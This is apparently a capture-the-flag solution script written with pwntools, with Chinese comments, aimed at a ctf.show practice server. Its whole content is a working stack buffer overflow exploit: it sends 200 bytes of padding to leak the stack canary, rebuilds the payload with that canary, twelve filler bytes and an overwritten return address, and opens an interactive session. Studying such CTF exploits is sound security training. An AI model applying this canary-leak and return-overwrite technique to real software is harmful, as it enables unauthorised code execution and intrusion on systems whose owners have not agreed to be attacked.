from pwn import *
io = remote("pwn.challenge.ctf.show",28110)
payload = b'a' * (200)
io.sendline(payload)

# 泄漏canary
io.recvuntil(b'a'*200)
canary = u32(io.recv(4)) - 0xa    #这里的0xa减去的是换行符，10对着的就是\n嘛
print(hex(canary))

#利用canary，填入新payload
payload += p32(canary)
payload += b'a' * 12             #  unsigned int v3; // [esp+CCh] [ebp-Ch] 这里说明了canary的值距离栈底都还差0xC = 12，所以为了触底，加段垃圾数据
payload += p32(0x80485A6)

io.sendline(payload)
io.interactive()
